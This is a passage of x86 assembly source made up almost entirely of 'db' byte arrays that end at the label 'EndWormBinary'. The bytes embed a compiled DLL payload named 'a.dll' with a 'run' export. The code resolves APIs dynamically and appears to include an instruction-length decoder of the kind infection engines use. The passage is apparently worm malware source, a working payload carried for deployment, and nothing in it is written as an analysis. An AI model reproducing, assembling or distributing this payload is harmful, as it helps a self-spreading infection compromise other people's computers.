db 02bh, 0d6h, 003h, 0d7h, 081h, 0fah, 004h, 001h, 000h, 000h, 073h, 01dh, 08ah, 094h
db 005h, 0e0h, 0fdh, 0ffh, 0ffh, 08dh, 034h, 001h, 040h, 088h, 094h, 035h, 0e0h, 0fdh
db 0ffh, 0ffh, 038h, 09ch, 005h, 0e0h, 0fdh, 0ffh, 0ffh, 075h, 0d1h, 0ebh, 002h, 033h
db 0c0h, 03bh, 0c3h, 074h, 021h, 0ffh, 075h, 01ch, 088h, 01ch, 038h, 08dh, 085h, 0f4h
db 0feh, 0ffh, 0ffh, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h
db 00ch, 050h, 0e8h, 0e2h, 0fdh, 0ffh, 0ffh, 083h, 0c4h, 018h, 08dh, 085h, 0b4h, 0fdh
db 0ffh, 0ffh, 050h, 0ffh, 075h, 0f8h, 0ffh, 055h, 008h, 085h, 0c0h, 075h, 083h, 039h
db 05dh, 0fch, 074h, 006h, 0ffh, 075h, 0f8h, 0ffh, 055h, 0fch, 06ah, 001h, 058h, 0ebh
db 002h, 033h, 0c0h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 004h
db 001h, 000h, 000h, 0a1h, 0f0h, 050h, 000h, 000h, 085h, 0c0h, 075h, 014h, 068h, 0a8h
db 014h, 000h, 000h, 0ffh, 015h, 094h, 050h, 000h, 000h, 085h, 0c0h, 0a3h, 0f0h, 050h
db 000h, 000h, 074h, 047h, 068h, 0b8h, 014h, 000h, 000h, 050h, 0ffh, 015h, 098h, 050h
db 000h, 000h, 085h, 0c0h, 074h, 037h, 08dh, 08dh, 0fch, 0feh, 0ffh, 0ffh, 051h, 068h
db 004h, 001h, 000h, 000h, 0ffh, 0d0h, 080h, 0bdh, 0fch, 0feh, 0ffh, 0ffh, 000h, 074h
db 020h, 0ffh, 075h, 018h, 08dh, 085h, 0fch, 0feh, 0ffh, 0ffh, 0ffh, 075h, 014h, 0ffh
db 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 050h, 0e8h, 0bbh, 0fdh, 0ffh, 0ffh
db 083h, 0c4h, 018h, 0c9h, 0c3h, 033h, 0c0h, 0c9h, 0c3h, 0cch, 0cch, 0cch, 060h, 0fch
db 033h, 0d2h, 08bh, 074h, 024h, 024h, 08bh, 0ech, 068h, 01ch, 0f7h, 097h, 010h, 068h
db 080h, 067h, 01ch, 0f7h, 068h, 018h, 097h, 038h, 017h, 068h, 018h, 0b7h, 01ch, 010h
db 068h, 017h, 02ch, 030h, 017h, 068h, 017h, 030h, 017h, 018h, 068h, 047h, 0f5h, 015h
db 0f7h, 068h, 048h, 037h, 010h, 04ch, 068h, 0f7h, 0e7h, 02ch, 027h, 068h, 087h, 060h
db 0ach, 0f7h, 068h, 052h, 01ch, 012h, 01ch, 068h, 01ch, 087h, 010h, 07ch, 068h, 01ch
db 070h, 01ch, 020h, 068h, 02bh, 060h, 067h, 047h, 068h, 011h, 010h, 021h, 020h, 068h
db 025h, 016h, 012h, 040h, 068h, 022h, 020h, 087h, 082h, 068h, 020h, 012h, 020h, 047h
db 068h, 019h, 014h, 010h, 013h, 068h, 013h, 010h, 027h, 018h, 068h, 060h, 082h, 085h
db 028h, 068h, 045h, 040h, 012h, 015h, 068h, 0c7h, 0a0h, 016h, 050h, 068h, 012h, 018h
db 019h, 028h, 068h, 012h, 018h, 040h, 0f2h, 068h, 027h, 041h, 015h, 019h, 068h, 011h
db 0f0h, 0f0h, 050h, 0b9h, 010h, 047h, 012h, 015h, 051h, 068h, 047h, 012h, 015h, 011h
db 068h, 012h, 015h, 011h, 010h, 068h, 015h, 011h, 010h, 047h, 0b8h, 015h, 020h, 047h
db 012h, 050h, 050h, 068h, 010h, 01ah, 047h, 012h, 080h, 0c1h, 010h, 051h, 080h, 0e9h
db 020h, 051h, 033h, 0c9h, 049h, 041h, 08bh, 0fch, 0ach, 08ah, 0f8h, 08ah, 027h, 047h
db 0c0h, 0ech, 004h, 02ah, 0c4h, 073h, 0f6h, 08ah, 047h, 0ffh, 024h, 00fh, 03ch, 00ch
db 075h, 003h, 05ah, 0f7h, 0d2h, 042h, 03ch, 000h, 074h, 042h, 03ch, 001h, 074h, 0dbh
db 083h, 0c7h, 051h, 03ch, 00ah, 074h, 0d7h, 08bh, 07dh, 024h, 042h, 03ch, 002h, 074h
db 02fh, 03ch, 007h, 074h, 033h, 03ch, 00bh, 00fh, 084h, 07eh, 000h, 000h, 000h, 042h
db 03ch, 003h, 074h, 01eh, 03ch, 008h, 074h, 022h, 042h, 03ch, 004h, 074h, 015h, 042h
db 042h, 060h, 0b0h, 066h, 0f2h, 0aeh, 061h, 075h, 002h, 04ah, 04ah, 03ch, 009h, 074h
db 00dh, 02ch, 005h, 074h, 06ch, 042h, 08bh, 0e5h, 089h, 054h, 024h, 01ch, 061h, 0c3h
db 0ach, 08ah, 0e0h, 0c0h, 0e8h, 007h, 072h, 012h, 074h, 014h, 080h, 0c2h, 004h, 060h
db 0b0h, 067h, 0f2h, 0aeh, 061h, 075h, 009h, 080h, 0eah, 003h, 0feh, 0c8h, 075h, 0dch
db 042h, 040h, 080h, 0e4h, 007h, 060h, 0b0h, 067h, 0f2h, 0aeh, 061h, 074h, 013h, 080h
db 0fch, 004h, 074h, 017h, 080h, 0fch, 005h, 075h, 0c5h, 0feh, 0c8h, 074h, 0c1h, 080h
db 0c2h, 004h, 0ebh, 0bch, 066h, 03dh, 000h, 006h, 075h, 0b6h, 042h, 0ebh, 0b2h, 03ch
db 000h, 075h, 0aeh, 0ach, 024h, 007h, 02ch, 005h, 075h, 0a7h, 042h, 0ebh, 0e4h, 0f6h
db 006h, 038h, 075h, 0a8h, 0b0h, 008h, 0d0h, 0efh, 014h, 000h, 0e9h, 072h, 0ffh, 0ffh
db 0ffh, 080h, 0efh, 0a0h, 080h, 0ffh, 004h, 073h, 082h, 060h, 0b0h, 067h, 0f2h, 0aeh
db 061h, 075h, 002h, 04ah, 04ah, 060h, 0b0h, 066h, 0f2h, 0aeh, 061h, 00fh, 084h, 076h
db 0ffh, 0ffh, 0ffh, 00fh, 085h, 066h, 0ffh, 0ffh, 0ffh, 056h, 033h, 0f6h, 039h, 035h
db 090h, 050h, 000h, 000h, 075h, 033h, 0a1h, 0c0h, 050h, 000h, 000h, 03bh, 0c6h, 074h
db 004h, 0ffh, 0d0h, 0ebh, 00fh, 0a1h, 0bch, 050h, 000h, 000h, 03bh, 0c6h, 074h, 004h
db 0ffh, 0d0h, 0ebh, 002h, 033h, 0c0h, 08bh, 00dh, 0b8h, 050h, 000h, 000h, 0a3h, 090h
db 050h, 000h, 000h, 03bh, 0ceh, 074h, 008h, 03bh, 0c6h, 074h, 004h, 050h, 0ffh, 0d1h
db 059h, 0a1h, 0bch, 050h, 000h, 000h, 03bh, 0c6h, 074h, 032h, 057h, 0ffh, 0d0h, 08bh
db 0f0h, 0bfh, 0ffh, 000h, 000h, 000h, 023h, 0f7h, 0ffh, 015h, 0bch, 050h, 000h, 000h
db 0c1h, 0e0h, 008h, 00bh, 0f0h, 0c1h, 0e6h, 008h, 0ffh, 015h, 0bch, 050h, 000h, 000h
db 023h, 0c7h, 00bh, 0f0h, 0c1h, 0e6h, 008h, 0ffh, 015h, 0bch, 050h, 000h, 000h, 023h
db 0c7h, 05fh, 00bh, 0f0h, 08bh, 0c6h, 05eh, 0c3h, 053h, 08bh, 05ch, 024h, 008h, 057h
db 08bh, 07ch, 024h, 010h, 02bh, 0fbh, 074h, 03bh, 083h, 0ffh, 001h, 075h, 00eh, 0e8h
db 06bh, 0ffh, 0ffh, 0ffh, 0a8h, 001h, 075h, 02dh, 08dh, 043h, 001h, 0ebh, 02ah, 08bh
db 0c7h, 056h, 0c1h, 0e8h, 010h, 050h, 06ah, 000h, 0e8h, 01fh, 000h, 000h, 000h, 08bh
db 0f0h, 00fh, 0b7h, 0c7h, 050h, 06ah, 000h, 0c1h, 0e6h, 010h, 0e8h, 00fh, 000h, 000h
db 000h, 083h, 0c4h, 010h, 00bh, 0c6h, 003h, 0c3h, 05eh, 0ebh, 002h, 08bh, 0c3h, 05fh
db 05bh, 0c3h, 056h, 08bh, 074h, 024h, 00ch, 057h, 08bh, 07ch, 024h, 00ch, 02bh, 0f7h
db 066h, 085h, 0f6h, 076h, 02eh, 066h, 083h, 0feh, 001h, 075h, 00eh, 0e8h, 019h, 0ffh
db 0ffh, 0ffh, 0a8h, 001h, 075h, 01fh, 08dh, 047h, 001h, 0ebh, 01ch, 0e8h, 00bh, 0ffh
db 0ffh, 0ffh, 0b9h, 0ffh, 0ffh, 000h, 000h, 00fh, 0b7h, 0d6h, 023h, 0c1h, 00fh, 0afh
db 0c2h, 033h, 0d2h, 0f7h, 0f1h, 003h, 0c7h, 0ebh, 002h, 08bh, 0c7h, 05fh, 05eh, 0c3h
db 0e8h, 0ech, 0feh, 0ffh, 0ffh, 085h, 0c0h, 074h, 011h, 03ch, 061h, 07eh, 004h, 03ch
db 07ah, 07ch, 00bh, 03ch, 041h, 07eh, 0ebh, 03ch, 05ah, 07dh, 0e7h, 0c3h, 0b0h, 061h
db 0c3h, 053h, 08bh, 05ch, 024h, 008h, 056h, 08bh, 074h, 024h, 010h, 083h, 0feh, 004h
db 07ch, 01bh, 057h, 08bh, 0feh, 0c1h, 0efh, 002h, 08bh, 0c7h, 0f7h, 0d8h, 08dh, 034h
db 086h, 0e8h, 0b3h, 0feh, 0ffh, 0ffh, 089h, 003h, 083h, 0c3h, 004h, 04fh, 075h, 0f3h
db 05fh, 085h, 0f6h, 074h, 00fh, 0e8h, 0a1h, 0feh, 0ffh, 0ffh, 08bh, 04ch, 024h, 00ch
db 088h, 004h, 031h, 04eh, 075h, 0f1h, 08bh, 044h, 024h, 00ch, 05eh, 05bh, 0c3h, 06ah
db 001h, 058h, 0c2h, 00ch, 000h, 055h, 08bh, 0ech, 053h, 056h, 057h, 08dh, 005h, 000h
db 051h, 000h, 000h, 089h, 018h, 089h, 068h, 004h, 089h, 070h, 008h, 089h, 078h, 00ch
db 0ffh, 075h, 020h, 0ffh, 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h
db 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 01dh, 000h, 000h, 000h, 083h, 0c4h
db 01ch, 08dh, 005h, 000h, 051h, 000h, 000h, 08bh, 018h, 08bh, 068h, 004h, 08bh, 070h
db 008h, 08bh, 078h, 00ch, 05fh, 05eh, 033h, 0c0h, 05bh, 05dh, 0c2h, 01ch, 000h, 055h
db 08bh, 0ech, 08bh, 045h, 008h, 085h, 0c0h, 00fh, 084h, 08fh, 002h, 000h, 000h, 08bh
db 04dh, 00ch, 085h, 0c9h, 00fh, 084h, 084h, 002h, 000h, 000h, 068h, 0ech, 015h, 000h
db 000h, 0a3h, 094h, 050h, 000h, 000h, 089h, 00dh, 098h, 050h, 000h, 000h, 0ffh, 0d0h
db 085h, 0c0h, 0a3h, 0e4h, 050h, 000h, 000h, 074h, 025h, 068h, 0e0h, 015h, 000h, 000h
db 050h, 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h, 0a3h, 0e0h, 050h, 000h, 000h
db 074h, 010h, 06ah, 000h, 068h, 0cch, 015h, 000h, 000h, 068h, 080h, 015h, 000h, 000h
db 06ah, 000h, 0ffh, 0d0h, 068h, 074h, 015h, 000h, 000h, 0ffh, 015h, 094h, 050h, 000h
db 000h, 085h, 0c0h, 0a3h, 0ech, 050h, 000h, 000h, 00fh, 084h, 02ch, 002h, 000h, 000h
db 068h, 0a8h, 014h, 000h, 000h, 0ffh, 015h, 094h, 050h, 000h, 000h, 085h, 0c0h, 0a3h
db 0f0h, 050h, 000h, 000h, 074h, 027h, 068h, 068h, 015h, 000h, 000h, 050h, 0ffh, 015h
db 098h, 050h, 000h, 000h, 068h, 058h, 015h, 000h, 000h, 0a3h, 0b0h, 050h, 000h, 000h
db 0ffh, 035h, 0f0h, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 0a3h, 0c0h
db 050h, 000h, 000h, 068h, 050h, 015h, 000h, 000h, 0ffh, 035h, 0ech, 050h, 000h, 000h
db 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h, 0a3h, 09ch, 050h, 000h, 000h, 00fh
db 084h, 0bbh, 001h, 000h, 000h, 068h, 048h, 015h, 000h, 000h, 0ffh, 035h, 0ech, 050h
db 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h, 0a3h, 0a0h, 050h, 000h
db 000h, 00fh, 084h, 09dh, 001h, 000h, 000h, 068h, 040h, 015h, 000h, 000h, 0ffh, 035h
db 0ech, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h, 0a3h, 0a4h
db 050h, 000h, 000h, 00fh, 084h, 07fh, 001h, 000h, 000h, 068h, 038h, 015h, 000h, 000h
db 0ffh, 035h, 0ech, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h
db 0a3h, 0a8h, 050h, 000h, 000h, 00fh, 084h, 061h, 001h, 000h, 000h, 068h, 030h, 015h
db 000h, 000h, 0ffh, 035h, 0ech, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h
db 085h, 0c0h, 0a3h, 0ach, 050h, 000h, 000h, 00fh, 084h, 043h, 001h, 000h, 000h, 068h
db 028h, 015h, 000h, 000h, 0ffh, 035h, 0ech, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h
db 000h, 000h, 085h, 0c0h, 0a3h, 0b4h, 050h, 000h, 000h, 00fh, 084h, 025h, 001h, 000h
db 000h, 068h, 020h, 015h, 000h, 000h, 0ffh, 035h, 0ech, 050h, 000h, 000h, 0ffh, 015h
db 098h, 050h, 000h, 000h, 085h, 0c0h, 0a3h, 0d4h, 050h, 000h, 000h, 00fh, 084h, 007h
db 001h, 000h, 000h, 068h, 018h, 015h, 000h, 000h, 0ffh, 035h, 0ech, 050h, 000h, 000h
db 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h, 0a3h, 0d8h, 050h, 000h, 000h, 00fh
db 084h, 0e9h, 000h, 000h, 000h, 068h, 010h, 015h, 000h, 000h, 0ffh, 035h, 0ech, 050h
db 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h, 0a3h, 0dch, 050h, 000h
db 000h, 00fh, 084h, 0cbh, 000h, 000h, 000h, 068h, 004h, 015h, 000h, 000h, 0ffh, 035h
db 0f0h, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h, 0a3h, 0cch
db 050h, 000h, 000h, 00fh, 084h, 0adh, 000h, 000h, 000h, 068h, 0f8h, 014h, 000h, 000h
db 0ffh, 035h, 0f0h, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h
db 0a3h, 0c4h, 050h, 000h, 000h, 00fh, 084h, 08fh, 000h, 000h, 000h, 068h, 0ech, 014h
db 000h, 000h, 0ffh, 035h, 0f0h, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h
db 085h, 0c0h, 0a3h, 0c8h, 050h, 000h, 000h, 074h, 075h, 068h, 0e0h, 014h, 000h, 000h
db 0ffh, 035h, 0f0h, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 085h, 0c0h
db 0a3h, 0d0h, 050h, 000h, 000h, 074h, 05bh, 068h, 0d8h, 014h, 000h, 000h, 0ffh, 035h
db 0ech, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 068h, 0d0h, 014h, 000h
db 000h, 0a3h, 0bch, 050h, 000h, 000h, 0ffh, 035h, 0ech, 050h, 000h, 000h, 0ffh, 015h
db 098h, 050h, 000h, 000h, 0ffh, 075h, 020h, 0a3h, 0b8h, 050h, 000h, 000h, 0ffh, 075h
db 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0e8h, 0afh, 0f9h, 0ffh
db 0ffh, 0ffh, 035h, 0ech, 050h, 000h, 000h, 0e8h, 02ch, 000h, 000h, 000h, 0ffh, 035h
db 0f0h, 050h, 000h, 000h, 0e8h, 021h, 000h, 000h, 000h, 083h, 0c4h, 01ch, 0ebh, 018h
db 0ffh, 035h, 0ech, 050h, 000h, 000h, 0e8h, 011h, 000h, 000h, 000h, 0ffh, 035h, 0f0h
db 050h, 000h, 000h, 0e8h, 006h, 000h, 000h, 000h, 059h, 059h, 033h, 0c0h, 05dh, 0c3h
db 0a1h, 0b0h, 050h, 000h, 000h, 085h, 0c0h, 074h, 006h, 0ffh, 074h, 024h, 004h, 0ffh
db 0d0h, 0c3h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 02bh, 060h, 047h, 041h, 000h, 000h
db 000h, 000h, 042h, 051h, 000h, 000h, 001h, 000h, 000h, 000h, 001h, 000h, 000h, 000h
db 001h, 000h, 000h, 000h, 038h, 051h, 000h, 000h, 03ch, 051h, 000h, 000h, 040h, 051h
db 000h, 000h, 091h, 04dh, 000h, 000h, 048h, 051h, 000h, 000h, 000h, 000h, 061h, 02eh
db 064h, 06ch, 06ch, 000h, 072h, 075h, 06eh, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 028h, 000h, 000h, 000h
db 04bh, 039h, 09eh, 039h, 019h, 03ah, 049h, 03bh, 04dh, 03bh, 051h, 03bh, 055h, 03bh
db 059h, 03bh, 05dh, 03bh, 061h, 03bh, 065h, 03bh, 069h, 03bh, 06dh, 03bh, 071h, 03bh
db 08eh, 03bh, 0b1h, 03bh, 000h, 020h, 000h, 000h, 034h, 000h, 000h, 000h, 083h, 03dh
db 093h, 03dh, 0efh, 03dh, 006h, 03eh, 047h, 03eh, 04bh, 03eh, 04fh, 03eh, 053h, 03eh
db 057h, 03eh, 05bh, 03eh, 05fh, 03eh, 063h, 03eh, 0dch, 03eh, 005h, 03fh, 009h, 03fh
db 00dh, 03fh, 011h, 03fh, 015h, 03fh, 019h, 03fh, 01dh, 03fh, 021h, 03fh, 000h, 000h
db 000h, 030h, 000h, 000h, 0e8h, 000h, 000h, 000h, 0e2h, 030h, 0ech, 030h, 003h, 031h
db 01ah, 031h, 02dh, 031h, 046h, 031h, 068h, 031h, 076h, 031h, 083h, 031h, 096h, 031h
db 0a1h, 031h, 0b8h, 031h, 0dch, 031h, 0ebh, 031h, 006h, 032h, 0eah, 032h, 0f3h, 032h
db 014h, 033h, 05dh, 033h, 072h, 033h, 0aeh, 033h, 0c0h, 033h, 025h, 034h, 033h, 034h
db 03ah, 034h, 055h, 034h, 071h, 034h, 087h, 034h, 018h, 035h, 02dh, 035h, 03bh, 035h
db 063h, 035h, 06ch, 035h, 07dh, 035h, 0b4h, 035h, 0bdh, 035h, 0ddh, 035h, 0f3h, 035h
db 008h, 036h, 02fh, 036h, 044h, 036h, 054h, 036h, 064h, 036h, 06bh, 036h, 086h, 036h
db 0bah, 036h, 0cch, 036h, 0f7h, 036h, 006h, 037h, 0e1h, 037h, 0fbh, 037h, 00bh, 038h
db 012h, 038h, 01bh, 038h, 060h, 038h, 077h, 038h, 07eh, 038h, 087h, 038h, 096h, 038h
db 0ceh, 038h, 0d7h, 038h, 0f2h, 038h, 000h, 039h, 011h, 039h, 026h, 039h, 046h, 039h
db 056h, 039h, 066h, 039h, 09bh, 039h, 0a2h, 039h, 0b2h, 039h, 0c5h, 039h, 0d3h, 039h
db 0dch, 039h, 0f1h, 039h, 006h, 03ah, 045h, 03ah, 05ah, 03ah, 067h, 03ah, 070h, 03ah
db 089h, 03ah, 092h, 03ah, 0b5h, 03ah, 0c3h, 03ah, 0d3h, 03ah, 0e9h, 03ah, 0feh, 03ah
db 01bh, 03bh, 02ch, 03bh, 043h, 03bh, 04ch, 03bh, 066h, 03bh, 074h, 03bh, 09dh, 03bh
db 0b2h, 03bh, 0c0h, 03bh, 0cch, 03bh, 062h, 03ch, 06bh, 03ch, 087h, 03ch, 0beh, 03ch
db 0e0h, 03ch, 016h, 03dh, 0a5h, 03dh, 0e3h, 03dh, 034h, 03eh, 0a0h, 03eh, 0dbh, 03eh
db 013h, 03fh, 032h, 03fh, 057h, 03fh, 0e4h, 03fh, 000h, 040h, 000h, 000h, 040h, 001h
db 000h, 000h, 08bh, 030h, 09ah, 030h, 0ach, 030h, 0bbh, 030h, 0cch, 030h, 0dbh, 030h
db 0f1h, 030h, 003h, 031h, 00dh, 031h, 017h, 031h, 046h, 031h, 099h, 031h, 0bah, 031h
db 0ech, 031h, 009h, 032h, 012h, 032h, 025h, 032h, 032h, 032h, 040h, 032h, 049h, 032h
db 05ah, 032h, 07dh, 032h, 086h, 032h, 092h, 032h, 099h, 032h, 011h, 033h, 01ah, 033h
db 053h, 033h, 01eh, 035h, 02ch, 035h, 046h, 035h, 059h, 035h, 063h, 035h, 06eh, 035h
db 083h, 035h, 08ch, 035h, 0ach, 035h, 0bbh, 035h, 0cdh, 035h, 0dch, 035h, 0f0h, 035h
db 0fdh, 035h, 06ah, 036h, 071h, 036h, 088h, 036h, 091h, 036h, 0b6h, 036h, 0c8h, 036h
db 0e4h, 036h, 0fch, 036h, 00bh, 037h, 01ch, 037h, 093h, 037h, 09fh, 037h, 0e1h, 038h
db 0eah, 038h, 0f0h, 038h, 0f7h, 038h, 002h, 039h, 009h, 039h, 00eh, 039h, 016h, 039h
db 01ch, 039h, 021h, 039h, 02ah, 039h, 030h, 039h, 002h, 03ah, 00bh, 03ah, 011h, 03ah
db 018h, 03ah, 01fh, 03ah, 026h, 03ah, 020h, 03ch, 027h, 03ch, 034h, 03ch, 044h, 03ch
db 049h, 03ch, 05ah, 03ch, 070h, 03ch, 07eh, 03ch, 08bh, 03ch, 099h, 03dh, 0c7h, 03dh
db 0f9h, 03dh, 0feh, 03dh, 004h, 03eh, 00dh, 03eh, 014h, 03eh, 01bh, 03eh, 022h, 03eh
db 02bh, 03eh, 030h, 03eh, 039h, 03eh, 03fh, 03eh, 046h, 03eh, 051h, 03eh, 057h, 03eh
db 05eh, 03eh, 065h, 03eh, 06ch, 03eh, 071h, 03eh, 076h, 03eh, 07ch, 03eh, 082h, 03eh
db 087h, 03eh, 08ch, 03eh, 092h, 03eh, 098h, 03eh, 09fh, 03eh, 0aah, 03eh, 0b0h, 03eh
db 0b6h, 03eh, 0bdh, 03eh, 0c8h, 03eh, 0ceh, 03eh, 0d4h, 03eh, 0dbh, 03eh, 0e6h, 03eh
db 0ech, 03eh, 0f2h, 03eh, 0f9h, 03eh, 004h, 03fh, 00ah, 03fh, 010h, 03fh, 017h, 03fh
db 022h, 03fh, 028h, 03fh, 02eh, 03fh, 035h, 03fh, 040h, 03fh, 046h, 03fh, 04ch, 03fh
db 053h, 03fh, 05eh, 03fh, 064h, 03fh, 06ah, 03fh, 071h, 03fh, 07ch, 03fh, 082h, 03fh
db 088h, 03fh, 08fh, 03fh, 09ah, 03fh, 0a0h, 03fh, 0a6h, 03fh, 0adh, 03fh, 0b8h, 03fh
db 0beh, 03fh, 0c4h, 03fh, 0cbh, 03fh, 0d6h, 03fh, 0dch, 03fh, 0e2h, 03fh, 0e9h, 03fh
db 0f0h, 03fh, 0f6h, 03fh, 0fch, 03fh, 000h, 050h, 000h, 000h, 024h, 000h, 000h, 000h
db 003h, 030h, 00ah, 030h, 010h, 030h, 016h, 030h, 01bh, 030h, 020h, 030h, 026h, 030h
db 02ch, 030h, 034h, 030h, 04bh, 030h, 056h, 030h, 066h, 030h, 071h, 030h, 081h, 030h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 04eh, 042h, 031h, 030h, 000h, 000h
db 000h, 000h, 02bh, 060h, 047h, 041h, 001h, 000h, 000h, 000h, 043h, 03ah, 05ch, 074h
db 061h, 073h, 06dh, 05ch, 042h, 049h, 04eh, 05ch, 070h, 031h, 037h, 05ch, 044h, 04ch
db 04ch, 020h, 050h, 052h, 04fh, 04ah, 045h, 043h, 054h, 05ch, 064h, 065h, 062h, 075h
db 067h, 064h, 069h, 072h, 05ch, 061h, 02eh, 070h, 064h, 062h, 000h

EndWormBinary:

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
